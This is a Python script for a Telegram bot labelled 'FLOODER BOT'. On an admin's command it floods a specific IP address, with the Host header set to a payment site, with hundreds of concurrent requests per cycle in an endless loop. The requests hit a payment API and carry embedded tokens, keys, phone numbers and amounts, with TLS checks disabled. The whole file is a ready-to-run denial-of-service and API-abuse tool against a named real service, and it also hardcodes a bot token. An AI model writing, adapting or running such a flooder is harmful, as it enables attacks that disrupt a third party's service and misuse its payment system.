#!/usr/bin/env python3
"""
🔥 FLOODER BOT – 100% Working
"""
import asyncio
import aiohttp
import logging
import os
from datetime import datetime
from aiohttp import web
from itertools import cycle

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ─── LOGGING ──────────────────────────────────────────────
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ─── TELEGRAM CONFIG ──────────────────────────────────────
BOT_TOKEN = "8810691058:AAEzwc6Cu__7vTI6p95h8kKCOmQBt0verEU"
ADMIN_ID = 8401097557

# ─── URLS ──────────────────────────────────────────────
URLS = [
    "https://148.113.13.242/APIs/api?token=IKJ6bCOnVVkb1N5K5dIHOS00T7HwxGECTdR9d6ml&key=fMdb6XOjYp6U0JDj9pSl&paytoNumber=1730611550&amount=1&comment=hi",
    "https://148.113.13.242/APIs/api?token=cUcM3sX925Z0vEqJ5Er80HNd7mpDQLHWJrlZ5Y5Ln&key=e7oIeqLCd4N32M2A&paytoNumber=9234383141&amount=1&comment=hi"
]

HEADERS = {
    "Host": "ultra-pay.in",
    "User-Agent": "Mozilla/5.0",
}

# ─── STATE ──────────────────────────────────────────────
total_requests = 0
successful_requests = 0
failed_requests = 0
running = False
flooder_task = None
CONCURRENT_LIMIT = 300

# ─── FETCH FUNCTION ────────────────────────────────────
async def fetch_one(session, url, semaphore, index):
    global total_requests, successful_requests, failed_requests
    
    async with semaphore:
        try:
            async with session.get(url, headers=HEADERS, ssl=False, timeout=15) as resp:
                status = resp.status
                total_requests += 1
                if status == 200:
                    successful_requests += 1
                else:
                    failed_requests += 1
                if index % 50 == 0:
                    logger.info(f"Req #{index} → {status}")
                return status
        except:
            total_requests += 1
            failed_requests += 1
            return None

# ─── FLOODER ────────────────────────────────────────────
async def flooder_loop():
    global running
    logger.info("🔥 Flooder started")
    
    connector = aiohttp.TCPConnector(ssl=False, limit=0)
    semaphore = asyncio.Semaphore(CONCURRENT_LIMIT)
    url_cycle = cycle(URLS)
    
    counter = 1
    async with aiohttp.ClientSession(connector=connector) as session:
        while running:
            tasks = []
            for _ in range(CONCURRENT_LIMIT):
                if not running:
                    break
                target_url = next(url_cycle)
                tasks.append(fetch_one(session, target_url, semaphore, counter))
                counter += 1
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(0.01)
    
    logger.info("Flooder stopped")

# ─── TELEGRAM COMMANDS ──────────────────────────────────
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await update.message.reply_text(
        "🔥 **FLOODER BOT**\n"
        "/status – Live stats\n"
        "/startflood – Start flood\n"
        "/stopflood – Stop flood\n"
        "/speed <num> – Set concurrent"
    )

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    global total_requests, successful_requests, failed_requests
    rate = (successful_requests / total_requests * 100) if total_requests > 0 else 0
    msg = (
        f"📊 **STATUS**\n"
        f"📤 Total: {total_requests:,}\n"
        f"✅ Success: {successful_requests:,}\n"
        f"❌ Failed: {failed_requests:,}\n"
        f"📈 Rate: {rate:.1f}%\n"
        f"🔄 Running: {'✅ Yes' if running else '❌ No'}\n"
        f"⚡ Speed: {CONCURRENT_LIMIT}"
    )
    await update.message.reply_text(msg)

async def start_flooder(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global running, flooder_task, total_requests, successful_requests, failed_requests
    if update.effective_user.id != ADMIN_ID:
        return
    if running:
        await update.message.reply_text("⚠️ Already running.")
        return
    total_requests = 0
    successful_requests = 0
    failed_requests = 0
    running = True
    flooder_task = asyncio.create_task(flooder_loop())
    await update.message.reply_text("▶️ Flooder started!")

async def stop_flooder(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global running
    if update.effective_user.id != ADMIN_ID:
        return
    if not running:
        await update.message.reply_text("⚠️ Already stopped.")
        return
    running = False
    if flooder_task:
        flooder_task.cancel()
    await update.message.reply_text("🛑 Flooder stopped!")

async def set_speed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global CONCURRENT_LIMIT
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        val = int(context.args[0])
        if val < 1:
            raise ValueError
        CONCURRENT_LIMIT = val
        await update.message.reply_text(f"⚡ Speed set to {val}")
    except:
        await update.message.reply_text("❌ Usage: /speed <number>")

# ─── HEALTH CHECK ──────────────────────────────────────────
async def health(request):
    return web.Response(text="✅ Bot is online", status=200)

async def run_webserver():
    app = web.Application()
    app.router.add_get('/', health)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", "8080"))
    site = web.TCPSite(runner, host='0.0.0.0', port=port)
    await site.start()
    await asyncio.Event().wait()

# ─── MAIN ──────────────────────────────────────────────────
async def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("startflood", start_flooder))
    app.add_handler(CommandHandler("stopflood", stop_flooder))
    app.add_handler(CommandHandler("speed", set_speed))
    
    try:
        await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 Bot Online")
    except:
        pass
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    try:
        await asyncio.gather(
            run_webserver(),
            asyncio.Event().wait()
        )
    except:
        pass
    finally:
        await app.updater.stop()
        await app.stop()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Exiting.")
